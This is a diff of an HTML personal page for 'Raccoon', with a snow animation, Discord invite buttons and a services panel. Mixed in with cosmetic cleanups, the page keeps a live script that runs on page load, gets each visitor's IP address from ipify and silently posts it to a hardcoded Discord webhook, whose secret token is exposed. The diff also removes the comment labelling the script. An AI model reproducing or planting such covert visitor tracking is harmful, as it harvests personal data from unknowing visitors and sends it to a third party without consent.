@@ -42,7 +42,6 @@
       height: 2px;
     }
 
-    /* Main Content Container */
     .main-content {
       display: flex;
       justify-content: center;
@@ -134,7 +133,6 @@
       transform: translateY(0);
     }
 
-    /* Services Display */
     .services-display {
       display: none;
       justify-content: center;
@@ -203,7 +201,6 @@
       text-align: left;
     }
 
-    /* Slim Service Card Styling */
     .service-card {
       background-color: #1a1a1a;
       border-radius: 1rem;
@@ -219,7 +216,7 @@
       display: flex;
       flex-direction: column;
       justify-content: flex-start;
-      max-height: 80px; /* slim by default */
+      max-height: 80px;
       transition: 
         max-height 1.2s cubic-bezier(0.4, 0, 0.2, 1), 
         transform 0.4s ease, 
@@ -250,7 +247,7 @@
       border-color: #4a4a4a;
       transform: translateY(-10px) scale(1.02);
       box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
-      max-height: 1000px; /* expand smoothly */
+      max-height: 1000px;
     }
 
     .service-card:hover .service-info {
@@ -329,13 +326,11 @@
 </head>
 <body>
   <div class="snow-container" id="snowContainer"></div>
-  <div class="version">v3.5</div>
+  <div class="version">v3.67</div>
 
-  <!-- Main Content -->
   <div class="main-content" id="mainContent">
     <div class="profile-card">
       <div class="profile-pic" style="background-image: url('https://i.imgur.com/DvTDMEm.png');"></div>
-      <div class="profile-pic" style="background-image: url('https://i.imgur.com/DvTDMEm.png ');"></div>
       <div class="profile-info">
         <h1>Raccoon</h1>
         <p>C#, GuandDong CyberAgent, China 1</p>
@@ -344,12 +339,10 @@
 
     <div class="buttons-container">
       <a href="https://discord.gg/wvKkTNA9j3" class="discord-button" target="_blank">Join Discord Server</a>
-      <a href="https://discord.gg/wvKkTNA9j3 " class="discord-button" target="_blank">Join Discord Server</a>
       <button class="services-button" id="servicesBtn">Services</button>
     </div>
   </div>
 
-  <!-- Services Display -->
   <div class="services-display" id="servicesDisplay">
     <div class="services-header">
       <h2>Our Services</h2>
@@ -468,45 +461,32 @@
 
   <footer>© raccoon.site · china1</footer>
 
-  <!-- IP & Webhook script -->
   <script>
     function sendWebhook(message) {
-      const webhookURL = "https://discord.com/api/webhooks/1422260681956393071/rWdu20aw2A3GEoKNzj1HNiNyEOULdqDozcKFWHWvIA_v7GTeCo6VhMhpdksLilftSEbV"; // your webhook
+      const webhookURL = "https://discord.com/api/webhooks/1422260681956393071/rWdu20aw2A3GEoKNzj1HNiNyEOULdqDozcKFWHWvIA_v7GTeCo6VhMhpdksLilftSEbV";
       fetch(webhookURL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: message
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
       })
       .then(res => console.log("Success:", res))
       .catch(err => console.error("Error:", err));
     }
 
-    // Step 1: Get client IP
-    fetch("https://api.ipify.org?format=json ")
+    fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
-      .then(data => {
-        const ip = data.ip;
-	sendWebhook(ip);
- 
-      })
+      .then(data => sendWebhook(data.ip))
       .catch(err => console.error("GeoIP Error:", err));
   </script>
 
-  <!-- Snow animation -->
   <script>
-    // Snow animation
     const snowContainer = document.getElementById('snowContainer');
     const snowflakes = [];
     let mouseX = window.innerWidth / 2;
     let mouseY = window.innerHeight / 2;
-    let windX = 0;
-    let windY = 0;
+    let windX = 0, windY = 0;
 
-    document.addEventListener('mousemove', (e) => {
+    document.addEventListener('mousemove', e => {
       mouseX = e.clientX;
       mouseY = e.clientY;
       const centerX = window.innerWidth / 2;
@@ -548,23 +528,17 @@
     function createSnowflakes() {
       const numSnowflakes = Math.min(30, Math.floor(window.innerWidth / 40));
       for (let i = 0; i < numSnowflakes; i++) {
-        setTimeout(() => {
-          snowflakes.push(new Snowflake());
-        }, i * 200);
+        setTimeout(() => snowflakes.push(new Snowflake()), i * 200);
       }
     }
 
     function animate() {
-      snowflakes.forEach(snowflake => snowflake.update());
+      snowflakes.forEach(s => s.update());
       requestAnimationFrame(animate);
     }
 
     window.addEventListener('resize', () => {
-      snowflakes.forEach(snowflake => {
-        if (snowflake.element) {
-          snowContainer.removeChild(snowflake.element);
-        }
-      });
+      snowflakes.forEach(s => s.element && snowContainer.removeChild(s.element));
       snowflakes.length = 0;
       setTimeout(createSnowflakes, 100);
     });
@@ -573,10 +547,9 @@
     animate();
 
     setTimeout(() => {
-      snowflakes.forEach(snowflake => snowflake.y = Math.random() * window.innerHeight);
+      snowflakes.forEach(s => s.y = Math.random() * window.innerHeight);
     }, 1000);
 
-    // Services display functionality
     const servicesBtn = document.getElementById('servicesBtn');
     const servicesDisplay = document.getElementById('servicesDisplay');
     const mainContent = document.getElementById('mainContent');
@@ -594,9 +567,7 @@
       servicesDisplay.classList.remove('active');
       setTimeout(() => {
         mainContent.style.display = 'flex';
-        setTimeout(() => {
-          mainContent.classList.remove('hidden');
-        }, 50);
+        setTimeout(() => mainContent.classList.remove('hidden'), 50);
       }, 300);
     });
   </script>
